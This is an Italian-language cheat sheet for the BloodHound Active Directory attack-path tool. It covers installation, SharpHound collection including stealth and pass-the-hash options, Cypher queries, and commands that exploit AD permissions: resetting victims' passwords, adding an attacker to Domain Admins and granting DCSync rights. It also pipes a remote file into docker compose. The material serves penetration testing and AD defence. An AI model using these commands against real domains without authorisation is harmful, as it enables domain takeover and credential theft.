# 🩸 BloodHound - Visualizzazione dei percorsi di attacco Active Directory

```
  ██████╗ ██╗      ██████╗  ██████╗ ██████╗ ██╗  ██╗ ██████╗ ██╗   ██╗███╗   ██╗██████╗ 
  ██╔══██╗██║     ██╔═══██╗██╔═══██╗██╔══██╗██║  ██║██╔═══██╗██║   ██║████╗  ██║██╔══██╗
  ██████╔╝██║     ██║   ██║██║   ██║██║  ██║███████║██║   ██║██║   ██║██╔██╗ ██║██║  ██║
  ██╔══██╗██║     ██║   ██║██║   ██║██║  ██║██╔══██║██║   ██║██║   ██║██║╚██╗██║██║  ██║
  ██████╔╝███████╗╚██████╔╝╚██████╔╝██████╔╝██║  ██║╚██████╔╝╚██████╔╝██║ ╚████║██████╔╝
  ╚═════╝ ╚══════╝ ╚═════╝  ╚═════╝ ╚═════╝ ╚═╝  ╚═╝ ╚═════╝  ╚═════╝ ╚═╝  ╚═══╝╚═════╝ 
                        AD Attack Path Visualization
```

<p align="center">
  <img src="https://img.shields.io/badge/BloodHound-Active_Directory-red?style=for-the-badge" alt="BloodHound">
  <img src="https://img.shields.io/badge/Attack_Paths-blue?style=for-the-badge" alt="Attack Paths">
  <img src="https://img.shields.io/badge/Graph_Database-green?style=for-the-badge" alt="Graph">
</p>

---

## 📋 Indice

- [Cos'è BloodHound](#-cosè-bloodhound)
- [Installazione](#-installazione)
- [Raccolta dati con SharpHound](#-raccolta-dati-con-sharphound)
- [Utilizzo della GUI di BloodHound](#-utilizzo-della-gui-di-bloodhound)
- [Query predefinite](#-query-predefinite)
- [Query Cypher personalizzate](#-query-cypher-personalizzate)
- [Analisi dei percorsi di attacco](#-analisi-dei-percorsi-di-attacco)
- [BloodHound CE](#-bloodhound-ce)
- [Riferimento rapido](#-riferimento-rapido)

---

## 🎯 Cos'è BloodHound

**BloodHound** utilizza la teoria dei grafi per rivelare percorsi di attacco nascosti in Active Directory. Visualizza:

- 🔗 **Percorsi di Attacco** - Path verso l'Admin di Dominio
- 👤 **Relazioni Utente** - Appartenenze a gruppi, sessioni
- 💻 **Computer Trust** - Diritti di amministratore, sessioni
- 🔓 **Malconfigurazioni** - Permessi sfruttabili
- 🎯 **High-Value Targets** - Account critici

### Componenti

| Componente | Descrizione |
|-----------|-------------|
| **BloodHound** | GUI per la visualizzazione (basata su Neo4j) |
| **SharpHound** | Collettore dati (.exe o .ps1) |
| **Neo4j** | Backend database a grafo |
| **BloodHound CE** | Nuova edizione cloud/enterprise |

---

## 🚀 Installazione

### Kali Linux

```bash
# Installa BloodHound
sudo apt update
sudo apt install bloodhound

# Installa Neo4j
sudo apt install neo4j

# Avvia Neo4j
sudo neo4j start

# Accedi al browser Neo4j: http://localhost:7474
# Credenziali di default: neo4j / neo4j (da cambiare al primo accesso)

# Avvia BloodHound
bloodhound
```

### Windows

```powershell
# Scarica da release di GitHub
https://github.com/BloodHoundAD/BloodHound/releases

# Installa Neo4j Community Edition
https://neo4j.com/download/

# Avvia Neo4j
# Esegui come amministratore e avvia il servizio

# Esegui BloodHound.exe
```

### Docker (Consigliato)

```bash
# Neo4j con configurazione pronta per BloodHound
docker run -d \
  --name neo4j \
  -p 7474:7474 -p 7687:7687 \
  -e NEO4J_AUTH=neo4j/bloodhound \
  neo4j:4.4

# Attenti l'avvio, poi lancia BloodHound
bloodhound
```

---

## 📡 Raccolta dati con SharpHound

### Scarica SharpHound

```bash
# Dalle release di BloodHound
https://github.com/BloodHoundAD/BloodHound/tree/master/Collectors

# File:
# - SharpHound.exe (standalone)
# - SharpHound.ps1 (PowerShell)
```

### Raccolta base

```powershell
# Esegui SharpHound (default - tutti i metodi di raccolta)
.\SharpHound.exe

# Specifica dominio
.\SharpHound.exe -d domain.local

# Specifica output
.\SharpHound.exe -o C:\Temp\

# Versione PowerShell
Import-Module .\SharpHound.ps1
Invoke-BloodHound
```

### Metodi di raccolta

```powershell
# Tutti i metodi di raccolta
.\SharpHound.exe -c All

# Metodi specifici
.\SharpHound.exe -c Default
.\SharpHound.exe -c Group
.\SharpHound.exe -c Session
.\SharpHound.exe -c Trusts
.\SharpHound.exe -c ACL
.\SharpHound.exe -c Container
.\SharpHound.exe -c RDP
.\SharpHound.exe -c DCOM
.\SharpHound.exe -c PSRemote
.\SharpHound.exe -c LocalAdmin
.\SharpHound.exe -c LocalGroup
.\SharpHound.exe -c SPNTargets
.\SharpHound.exe -c DCOnly
```

### Dettagli metodi di raccolta

| Metodo | Descrizione | Rilevabilità |
|--------|-------------|--------|
| Default | Group, LocalAdmin, Session, Trusts | Bassa |
| All | Tutto | Alta |
| Session | Utenti loggati | Media |
| LocalGroup | Membri gruppi locali | Media |
| ACL | Permessi ACL | Bassa |
| DCOnly | Solo DC | Molto bassa |
| Group | Appartenenze a gruppi | Bassa |
| Trusts | Trust di dominio | Bassa |

### Raccolta stealth

```powershell
# Modalità stealth (più lenta, meno rumore)
.\SharpHound.exe -c DCOnly
.\SharpHound.exe --stealth

# Nessuna risoluzione DNS
.\SharpHound.exe --skipdns

# Delay tra le richieste
.\SharpHound.exe --throttle 1000
```

### Raccolta in loop (Session)

```powershell
# Raccogli sessioni nel tempo
.\SharpHound.exe -c Session --loop --loopduration 02:00:00

# Loop con intervallo
.\SharpHound.exe -c Session --loop --loopinterval 00:05:00
```

### Da Linux (bloodhound.py)

```bash
# Installa
pip install bloodhound

# Esegui raccolta
bloodhound-python -u user -p 'password' -d domain.local -ns 10.10.10.1 -c All

# Con hash
bloodhound-python -u user --hashes :NTLMHASH -d domain.local -c All
```

---

## 🖥️ Utilizzo della GUI di BloodHound

### Avvia BloodHound

```bash
# 1. Avvia Neo4j
sudo neo4j start

# 2. Attendi Neo4j (controlla http://localhost:7474)

# 3. Avvia BloodHound
bloodhound

# 4. Login
# URL: bolt://localhost:7687
# Username: neo4j
# Password: (la tua password)
```

### Importa dati

```
1. Clicca il pulsante "Upload Data" (icona cartella)
2. Seleziona il file .zip da SharpHound
3. Attendi il completamento dell'import
4. I dati appaiono nel grafo
```

### Panoramica interfaccia

| Sezione | Descrizione |
|---------|-------------|
| **Search** | Cerca utenti, computer, gruppi |
| **Analysis** | Query predefinite |
| **Filters** | Visibilità edge/nodo |
| **Graph** | Rappresentazione visuale |
| **Node Info** | Dettagli sull'elemento selezionato |

### Navigazione

```
- Click sinistro: seleziona nodo
- Click destro: menu contestuale
- Scroll: zoom in/out
- Trascina: sposta la vista
- Ctrl+Click: aggiungi alla selezione
```

---

## 🔍 Query predefinite

### Informazioni Dominio

```
- Find all Domain Admins
- Find all Domain Controllers
- Find high value targets
- Map Domain Trusts
```

### Percorso più breve

```
- Shortest Paths to Domain Admins
- Shortest Path from Owned Principals
- Shortest Path to High Value Targets
- Shortest Path to Unconstrained Delegation
```

### Kerberos

```
- Find Kerberoastable Accounts
- Find AS-REP Roastable Users
- Shortest Path from Kerberoastable Users
- Find Principals with Unconstrained Delegation
```

### ACL Analysis

```
- Find Principals with DCSync Rights
- Find Dangerous Rights for Domain Users
- Find Users with Foreign Domain Group Membership
```

### Computer

```
- Find Computers with Unsupported OS
- Find Computers where Domain Users are Local Admin
- Find Computers with Sessions of High Value Users
```

### GPO

```
- Find all GPO Owned by Owned Principals
- Find GPO Affecting High Value Targets
```

---

## 📝 Query Cypher personalizzate

### Query di base

```cypher
// Trova tutti gli utenti
MATCH (u:User) RETURN u

// Trova tutti i computer
MATCH (c:Computer) RETURN c

// Trova tutti gli Admin di Dominio
MATCH (g:Group {name: "DOMAIN ADMINS@DOMAIN.LOCAL"})
MATCH (u:User)-[:MemberOf*1..]->(g)
RETURN u.name

// Trova tutti i Domain Controller
MATCH (c:Computer)-[:MemberOf*1..]->(g:Group)
WHERE g.name CONTAINS "DOMAIN CONTROLLERS"
RETURN c.name
```

### Query sulle sessioni

```cypher
// Trova dove gli Admin di Dominio hanno sessioni
MATCH (u:User)-[:MemberOf*1..]->(g:Group {name:"DOMAIN ADMINS@DOMAIN.LOCAL"})
MATCH (c:Computer)-[:HasSession]->(u)
RETURN u.name, c.name

// Trova utenti con sessioni su più computer
MATCH (c:Computer)-[:HasSession]->(u:User)
WITH u, COUNT(c) as sessions
WHERE sessions > 5
RETURN u.name, sessions
ORDER BY sessions DESC
```

### Query sui percorsi

```cypher
// Percorso più breve per Admin di Dominio
MATCH p=shortestPath(
  (u:User {name:"TARGETUSER@DOMAIN.LOCAL"})
  -[*1..]->(g:Group {name:"DOMAIN ADMINS@DOMAIN.LOCAL"})
)
RETURN p

// Tutti i percorsi per Admin di Dominio (limite 10)
MATCH p=(u:User)-[*1..5]->(g:Group {name:"DOMAIN ADMINS@DOMAIN.LOCAL"})
RETURN p LIMIT 10

// Percorsi da principal compromessi (Owned)
MATCH p=shortestPath(
  (u {owned:true})-[*1..]->(g:Group {name:"DOMAIN ADMINS@DOMAIN.LOCAL"})
)
RETURN p
```

### Query ACL

```cypher
// Utenti con diritti DCSync
MATCH (u)-[:GetChanges]->(d:Domain)
MATCH (u)-[:GetChangesAll]->(d)
RETURN u.name

// Utenti che possono resettare password
MATCH (u:User)-[:ForceChangePassword]->(t:User)
RETURN u.name, t.name

// Utenti con GenericAll sui computer
MATCH (u:User)-[:GenericAll]->(c:Computer)
RETURN u.name, c.name
```

### Query Kerberos

```cypher
// Utenti Kerberoastable con percorso per DA
MATCH (u:User {hasspn:true})
MATCH p=shortestPath((u)-[*1..]->(g:Group {name:"DOMAIN ADMINS@DOMAIN.LOCAL"}))
RETURN u.name, LENGTH(p)

// Utenti AS-REP roastable
MATCH (u:User {dontreqpreauth:true})
RETURN u.name

// Computer con unconstrained delegation
MATCH (c:Computer {unconstraineddelegation:true})
RETURN c.name
```

### High Value Targets

```cypher
// Segna high value targets
MATCH (u:User {name:"TARGETUSER@DOMAIN.LOCAL"})
SET u.highvalue = true

// Trova percorsi per high value targets
MATCH p=shortestPath(
  (u:User)-[*1..]->(t {highvalue:true})
)
RETURN p
```

---

## 🎯 Analisi dei percorsi di attacco

### Trovare i percorsi di attacco

```
1. Cerca il nodo di partenza (utente compromesso)
2. Click destro → "Mark as Owned"
3. Esegui la query: "Shortest Path from Owned Principals"
4. Analizza i collegamenti del percorso
```

### Edge di attacco comuni

| Edge | Metodo di attacco |
|------|-------------------|
| **MemberOf** | Appartenenza a gruppi |
| **AdminTo** | Diritti di amministratore locale |
| **HasSession** | Credential harvesting |
| **CanRDP** | Accesso RDP |
| **CanPSRemote** | PowerShell remoting |
| **ExecuteDCOM** | Esecuzione DCOM |
| **GenericAll** | Controllo totale |
| **GenericWrite** | Modifica oggetto |
| **WriteOwner** | Cambia owner |
| **WriteDacl** | Modifica ACL |
| **ForceChangePassword** | Reset password |
| **AddMember** | Aggiunta a gruppo |
| **AllExtendedRights** | DCSync, ecc. |
| **GetChanges** | DCSync (parte 1) |
| **GetChangesAll** | DCSync (parte 2) |

### Sfruttare gli edge di attacco

#### GenericAll su User

```powershell
# Reset password
net user targetuser NewP@ssw0rd /domain

# Oppure con PowerView
Set-DomainUserPassword -Identity targetuser -AccountPassword (ConvertTo-SecureString 'NewP@ssw0rd' -AsPlainText -Force)
```

#### GenericAll su Computer

```powershell
# Resource-based constrained delegation attack
# Usa Rubeus + PowerMad
```

#### ForceChangePassword

```powershell
# Reset password
net user targetuser NewP@ssw0rd /domain
```

#### AddMember

```powershell
# Aggiungi utente a gruppo
net group "Domain Admins" attackeruser /add /domain

# Oppure con PowerView
Add-DomainGroupMember -Identity "Domain Admins" -Members "attackeruser"
```

#### WriteDacl

```powershell
# Aggiungi diritti DCSync
Add-DomainObjectAcl -TargetIdentity "DC=domain,DC=local" -PrincipalIdentity attackeruser -Rights DCSync
```

---

## 🆕 BloodHound CE

### Informazioni su BloodHound CE

**BloodHound Community Edition** è la nuova versione:
- Interfaccia web moderna
- Backend PostgreSQL (non Neo4j)
- REST API
- Prestazioni migliorate

### Installazione

```bash
# Docker Compose (consigliato)
curl -L https://ghst.ly/getbhce | docker compose -f - up

# Accesso: http://localhost:8080
# Default: admin / (vedi log docker)
```

### SharpHound per CE

```powershell
# Scarica il collector compatibile CE
# Dalle release di BloodHound CE

# Esegui raccolta (stessa sintassi)
.\SharpHound.exe -c All
```

---

## 📊 Riferimento rapido

### Comandi SharpHound

| Comando | Descrizione |
|---------|-------------|
| `.\SharpHound.exe` | Raccolta di default |
| `.\SharpHound.exe -c All` | Tutti i metodi |
| `.\SharpHound.exe -c DCOnly` | Solo DC (stealth) |
| `.\SharpHound.exe -c Session --loop` | Loop sessioni |
| `.\SharpHound.exe -d domain.local` | Specifica dominio |
| `.\SharpHound.exe --stealth` | Modalità stealth |

### Query comuni

| Query | Scopo |
|-------|-------|
| Find all Domain Admins | Identifica membri DA |
| Shortest Path to DA | Trova percorso di attacco |
| Kerberoastable Users | Trova SPN da roastare |
| AS-REP Roastable | Utenti senza preauth |
| Unconstrained Delegation | Abuso delega |
| DCSync Rights | Trova i principals DCSync |

### Workflow di analisi

```
1. Raccogli con SharpHound
2. Importa in BloodHound
3. Segna i principal compromessi
4. Esegui "Shortest Path from Owned"
5. Analizza gli edge di attacco
6. Esegui gli attacchi
7. Segna nuovi principal compromessi
8. Ripeti
```

### File chiave

```
Output SharpHound:
- *_BloodHound.zip (dati JSON)
- computers.json
- users.json
- groups.json
- domains.json
- sessions.json
- ous.json
- gpos.json
- containers.json
```

---

## 📚 Risorse

- [BloodHound GitHub](https://github.com/BloodHoundAD/BloodHound)
- [SharpHound](https://github.com/BloodHoundAD/SharpHound)
- [BloodHound Docs](https://bloodhound.readthedocs.io/)
- [bloodhound.py](https://github.com/fox-it/BloodHound.py)

### Cheatsheet correlate
- [Mimikatz](../Mimikatz/translations/README.it.md)
- [PowerShell](../PowerShell/translations/README.it.md)
- [Windows PrivEsc](../Windows-PrivEsc/translations/README.it.md)

---

<p align="center">
  <b>🩸 Trova il tuo percorso verso l'Admin del Dominio!</b><br>
  <i>BloodHound - Il miglior amico di ogni pentester AD</i>
</p>
